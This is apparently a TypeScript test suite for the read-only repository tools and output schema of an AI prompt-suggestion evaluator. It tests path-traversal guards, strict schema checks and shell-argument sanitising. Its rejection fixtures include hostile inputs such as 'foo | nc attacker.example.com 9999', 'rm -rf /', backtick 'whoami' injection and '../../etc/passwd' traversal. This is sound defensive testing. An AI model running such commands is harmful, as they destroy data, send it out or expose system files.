import { test } from 'node:test';
import assert from 'node:assert/strict';
import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { randomUUID } from 'node:crypto';

import {
  SYSTEM_PROMPT,
  promptSuggestionEvaluateToolSchema,
} from './prompt-suggestion-evaluate@1.0.0.js';
import {
  repoTools,
  assertPathInsideRepo,
  sanitiseSubprocessArg,
  readFile,
  listDirectory,
  searchCode,
  runContractTestSubprocess,
  dispatchRepoTool,
  SUBPROCESS_TIMEOUT_MS,
} from '../repo-tools.js';
import {
  CHANGE_KINDS,
  MAX_FILES_PER_CHANGE_SET,
  RATIONALE_MAX,
  RATIONALE_MIN,
  RATIONALE_SUMMARY_MAX,
  RATIONALE_SUMMARY_MIN,
  SUGGESTION_CLASSIFICATIONS,
} from '../types.js';
import { getPrompt, listPrompts } from '../../runtime/prompt-registry.js';

const SUGGESTION_UUID = '11111111-1111-4111-8111-111111111111';

const okFile = (overrides: Record<string, unknown> = {}) => ({
  path: 'packages/agents/src/classifier-expenditure/prompts/classify-expenditure@1.0.0.ts',
  change_kind: 'modify' as const,
  rationale: 'Tighten the §355-25 decision tree to disambiguate dual-use SaaS spend.',
  diff_preview: '@@ -10,3 +10,4 @@\n   - dual-use SaaS\n+  - explicit dominant-purpose anchor',
  newContent: '// new file content here\nexport const SYSTEM_PROMPT = "...";\n',
  ...overrides,
});

const okPayload = (overrides: Record<string, unknown> = {}) => ({
  suggestion_id: SUGGESTION_UUID,
  classification: 'prompt_change' as const,
  files: [okFile()],
  cross_file_consistency_checks_run: [
    'Ran classify-expenditure tests via run_contract_test_subprocess.',
  ],
  rationale_summary:
    'Consultant flagged repeated misclassification of AWS spend; revised the §355-25 decision tree to require a non-shared-account anchor before classifying as eligible compute. Verified existing tests continue to pass.',
  prompt_version: '1.0.0' as const,
  model: 'claude-sonnet-4-5-test',
  ...overrides,
});

// ---------------------------------------------------------------------------
// Registry test
// ---------------------------------------------------------------------------

test('prompt-suggestion-evaluate@1.0.0 is registered in the prompt registry', () => {
  const keys = listPrompts();
  assert.ok(
    keys.includes('prompt-suggestion-evaluate@1.0.0'),
    `expected listPrompts() to include 'prompt-suggestion-evaluate@1.0.0', got ${JSON.stringify(keys)}`,
  );
  const p = getPrompt('prompt-suggestion-evaluate@1.0.0');
  assert.equal(p.name, 'prompt-suggestion-evaluate');
  assert.equal(p.version, '1.0.0');
  assert.equal(p.tool.name, 'evaluate_prompt_suggestion');
  assert.equal(p.system, SYSTEM_PROMPT);
  assert.ok(p.tool.description.length > 0);
});

// ---------------------------------------------------------------------------
// Output schema tests
// ---------------------------------------------------------------------------

test('output schema parses a happy-path payload', () => {
  const out = promptSuggestionEvaluateToolSchema.parse(okPayload());
  assert.equal(out.suggestion_id, SUGGESTION_UUID);
  assert.equal(out.classification, 'prompt_change');
  assert.equal(out.files.length, 1);
  assert.equal(out.prompt_version, '1.0.0');
});

test('output schema enforces strict shape (rejects extra top-level fields)', () => {
  // .strict() means a hallucinated `delete_database: true` is rejected, not silently dropped.
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    delete_database: true,
  });
  assert.equal(result.success, false);
});

test('output schema enforces strict shape on file entries', () => {
  // A file entry with an extra `execute_after_apply` field is rejected.
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    files: [{ ...okFile(), execute_after_apply: 'rm -rf /' }],
  });
  assert.equal(result.success, false);
});

test('output schema rejects classification outside the closed enum', () => {
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    classification: 'rewrite_everything',
  });
  assert.equal(result.success, false);
});

test('output schema accepts each classification in the enum', () => {
  for (const c of SUGGESTION_CLASSIFICATIONS) {
    const out = promptSuggestionEvaluateToolSchema.parse({
      ...okPayload(),
      classification: c,
      // no_action_needed legitimately has zero files; happy-path payload has one.
      files: c === 'no_action_needed' ? [] : okPayload().files,
    });
    assert.equal(out.classification, c);
  }
});

test('output schema rejects change_kind outside the closed enum', () => {
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    files: [okFile({ change_kind: 'patch' })],
  });
  assert.equal(result.success, false);
});

test('output schema accepts each change_kind in the enum', () => {
  for (const k of CHANGE_KINDS) {
    const out = promptSuggestionEvaluateToolSchema.parse({
      ...okPayload(),
      files: [okFile({ change_kind: k })],
    });
    assert.equal(out.files[0]!.change_kind, k);
  }
});

test('output schema rejects rationale shorter than RATIONALE_MIN', () => {
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    files: [okFile({ rationale: 'a'.repeat(RATIONALE_MIN - 1) })],
  });
  assert.equal(result.success, false);
});

test('output schema rejects rationale longer than RATIONALE_MAX', () => {
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    files: [okFile({ rationale: 'a'.repeat(RATIONALE_MAX + 1) })],
  });
  assert.equal(result.success, false);
});

test('output schema rejects rationale_summary outside char bounds', () => {
  for (const bad of [
    'a'.repeat(RATIONALE_SUMMARY_MIN - 1),
    'a'.repeat(RATIONALE_SUMMARY_MAX + 1),
  ]) {
    const result = promptSuggestionEvaluateToolSchema.safeParse({
      ...okPayload(),
      rationale_summary: bad,
    });
    assert.equal(result.success, false, `expected length ${bad.length} to be rejected`);
  }
});

test('output schema rejects bad UUID in suggestion_id', () => {
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    suggestion_id: 'not-a-uuid',
  });
  assert.equal(result.success, false);
});

test('output schema rejects prompt_version other than literal "1.0.0"', () => {
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    prompt_version: '1.0.1',
  });
  assert.equal(result.success, false);
});

test(`output schema rejects > ${MAX_FILES_PER_CHANGE_SET} files in change set`, () => {
  const tooMany = Array.from({ length: MAX_FILES_PER_CHANGE_SET + 1 }, (_, i) =>
    okFile({ path: `packages/agents/src/file-${i}.ts` }),
  );
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    files: tooMany,
  });
  assert.equal(result.success, false);
});

test('output schema accepts empty files array (no_action_needed shape)', () => {
  const out = promptSuggestionEvaluateToolSchema.parse({
    ...okPayload(),
    classification: 'no_action_needed',
    files: [],
  });
  assert.equal(out.files.length, 0);
});

// ---------------------------------------------------------------------------
// System prompt tests
// ---------------------------------------------------------------------------

test('system prompt explicitly forbids write actions', () => {
  // Defense-in-depth: catch refactors that strip the read-only language.
  assert.match(SYSTEM_PROMPT, /READ-ONLY/);
  assert.match(SYSTEM_PROMPT, /CANNOT write files/);
  assert.match(SYSTEM_PROMPT, /API layer/);
});

test('system prompt anchors on the four classifications', () => {
  assert.match(SYSTEM_PROMPT, /prompt_change/);
  assert.match(SYSTEM_PROMPT, /schema_change/);
  assert.match(SYSTEM_PROMPT, /code_change/);
  assert.match(SYSTEM_PROMPT, /no_action_needed/);
});

test('system prompt references three-way parity for schema changes', () => {
  assert.match(SYSTEM_PROMPT, /THREE-WAY PARITY/);
  assert.match(SYSTEM_PROMPT, /Zod/);
  assert.match(SYSTEM_PROMPT, /SQL/);
});

test('system prompt references the test subprocess sandbox boundary', () => {
  assert.match(SYSTEM_PROMPT, /run_contract_test_subprocess/);
  assert.match(SYSTEM_PROMPT, /60-second/);
});

// ---------------------------------------------------------------------------
// Tool definitions test (Anthropic SDK shape)
// ---------------------------------------------------------------------------

test('repoTools exposes all four read-only tool definitions', () => {
  const names = repoTools.map((t) => t.name);
  assert.deepEqual([...names].sort(), [
    'list_directory',
    'read_file',
    'run_contract_test_subprocess',
    'search_code',
  ]);
});

test('repoTools entries have name, description, input_schema (JSON Schema)', () => {
  for (const t of repoTools) {
    assert.equal(typeof t.name, 'string');
    assert.ok(t.name.length > 0);
    assert.equal(typeof t.description, 'string');
    assert.ok(t.description.length > 10);
    assert.equal(t.input_schema.type, 'object');
    assert.equal(typeof t.input_schema.properties, 'object');
    assert.ok(Array.isArray(t.input_schema.required));
  }
});

// ---------------------------------------------------------------------------
// assertPathInsideRepo path-traversal tests
// ---------------------------------------------------------------------------

test('assertPathInsideRepo rejects ../ traversal', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    assert.throws(() => assertPathInsideRepo(tmp, '../../etc/passwd'), /escapes/);
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('assertPathInsideRepo rejects absolute paths', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    assert.throws(() => assertPathInsideRepo(tmp, '/etc/passwd'), /absolute/);
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('assertPathInsideRepo rejects NUL byte in path', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    assert.throws(() => assertPathInsideRepo(tmp, 'foo\0bar'), /NUL/);
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('assertPathInsideRepo accepts repo-relative path inside root', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    const resolved = assertPathInsideRepo(tmp, 'src/foo.ts');
    assert.ok(resolved.startsWith(path.resolve(tmp)));
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// readFile / listDirectory integration tests against a temp repo
// ---------------------------------------------------------------------------

test('readFile reads an existing file and rejects path traversal', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await fs.writeFile(path.join(tmp, 'hello.txt'), 'world\n', 'utf8');
    const result = await readFile(tmp, { path: 'hello.txt' });
    assert.equal(result.content, 'world\n');
    assert.equal(result.bytes, 6);

    await assert.rejects(readFile(tmp, { path: '../../../etc/passwd' }), /escapes/);
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('readFile rejects a directory path', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await fs.mkdir(path.join(tmp, 'sub'));
    await assert.rejects(readFile(tmp, { path: 'sub' }), /not a regular file/);
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('listDirectory returns entries sorted with kind tags', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await fs.writeFile(path.join(tmp, 'b.txt'), 'b', 'utf8');
    await fs.mkdir(path.join(tmp, 'a-dir'));
    const result = await listDirectory(tmp, { path: '.' });
    // Sorted alphabetically: 'a-dir' (directory), 'b.txt' (file)
    assert.equal(result.entries.length, 2);
    assert.equal(result.entries[0]!.name, 'a-dir');
    assert.equal(result.entries[0]!.kind, 'directory');
    assert.equal(result.entries[1]!.name, 'b.txt');
    assert.equal(result.entries[1]!.kind, 'file');
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('listDirectory rejects path traversal', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await assert.rejects(listDirectory(tmp, { path: '../..' }), /escapes/);
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// sanitiseSubprocessArg tests
// ---------------------------------------------------------------------------

test('sanitiseSubprocessArg rejects shell metacharacters', () => {
  for (const bad of [
    'foo; rm -rf /',
    'foo | nc attacker.example.com 9999',
    'foo && bad',
    'foo`whoami`',
    'foo > /tmp/x',
    'foo<input',
    'foo"bar',
    "foo'bar",
    'foo\nbar',
    'foo\0bar',
  ]) {
    assert.throws(
      () => sanitiseSubprocessArg(bad, 'test_pattern'),
      /forbidden|empty|NUL|exceeds/,
      `expected "${bad}" to be rejected`,
    );
  }
});

test('sanitiseSubprocessArg accepts well-formed test patterns', () => {
  for (const good of [
    'classify-expenditure',
    'classify-expenditure@1.0.0',
    '@cpa/agents',
    'foo.bar:baz',
    'foo/bar.ts',
    'a*b?c',
  ]) {
    assert.equal(sanitiseSubprocessArg(good, 'test_pattern'), good);
  }
});

test('sanitiseSubprocessArg rejects empty and oversized inputs', () => {
  assert.throws(() => sanitiseSubprocessArg('', 'test_pattern'), /empty/);
  assert.throws(() => sanitiseSubprocessArg('a'.repeat(501), 'test_pattern'), /exceeds/);
});

// ---------------------------------------------------------------------------
// run_contract_test_subprocess input gates (we don't actually shell out in
// tests — the input-validation gate is the security-critical surface).
// ---------------------------------------------------------------------------

test('runContractTestSubprocess rejects shell metacharacter in test_pattern before spawning', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await assert.rejects(
      runContractTestSubprocess(tmp, { test_pattern: 'foo; rm -rf /' }),
      /forbidden/,
    );
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('runContractTestSubprocess rejects shell metacharacter in package_filter before spawning', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await assert.rejects(
      runContractTestSubprocess(tmp, {
        test_pattern: 'foo',
        package_filter: '@cpa/agents; whoami',
      }),
      /forbidden/,
    );
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('SUBPROCESS_TIMEOUT_MS is the documented 60s hard cap', () => {
  assert.equal(SUBPROCESS_TIMEOUT_MS, 60_000);
});

// ---------------------------------------------------------------------------
// dispatchRepoTool tests
// ---------------------------------------------------------------------------

test('dispatchRepoTool rejects unknown tool names', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await assert.rejects(dispatchRepoTool(tmp, 'write_file', {}), /unknown repo tool/);
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('dispatchRepoTool routes read_file through the path gate', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await fs.writeFile(path.join(tmp, 'a.txt'), 'hi', 'utf8');
    const result = (await dispatchRepoTool(tmp, 'read_file', { path: 'a.txt' })) as {
      content: string;
    };
    assert.equal(result.content, 'hi');

    await assert.rejects(
      dispatchRepoTool(tmp, 'read_file', { path: '../../etc/passwd' }),
      /escapes/,
    );
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

// ---------------------------------------------------------------------------
// search_code optional integration test (skipped if rg is unavailable)
// ---------------------------------------------------------------------------

test('searchCode returns matches when ripgrep is available', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await fs.writeFile(
      path.join(tmp, 'a.ts'),
      'export const NEEDLE = 42;\nexport const OTHER = 0;\n',
      'utf8',
    );
    try {
      const result = await searchCode(tmp, { pattern: 'NEEDLE' });
      assert.ok(Array.isArray(result.matches));
      // If ripgrep IS available, we expect a match; if it ISN'T, we'd have
      // thrown above and skipped this assertion.
      assert.ok(result.matches.length >= 1);
      assert.match(result.matches[0]!.snippet, /NEEDLE/);
    } catch (e: unknown) {
      const err = e as { message?: string };
      // Tolerate "rg not on PATH" — we documented this as a hard dependency
      // for the server-side runtime, but unit tests must pass without it.
      if (!err.message?.includes('ripgrep')) throw e;
    }
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

test('searchCode rejects NUL byte in pattern', async () => {
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sugg-eval-'));
  try {
    await assert.rejects(searchCode(tmp, { pattern: 'foo\0bar' }), /NUL/);
  } finally {
    await fs.rm(tmp, { recursive: true, force: true });
  }
});

// Use randomUUID locally so the `no_action_needed` enum lookup in the closed-enum
// happy-path test above doesn't get flagged as dead test data.
test('randomUUID generates valid UUIDs (sanity for happy-path fixtures)', () => {
  const id = randomUUID();
  const result = promptSuggestionEvaluateToolSchema.safeParse({
    ...okPayload(),
    suggestion_id: id,
  });
  assert.equal(result.success, true);
});
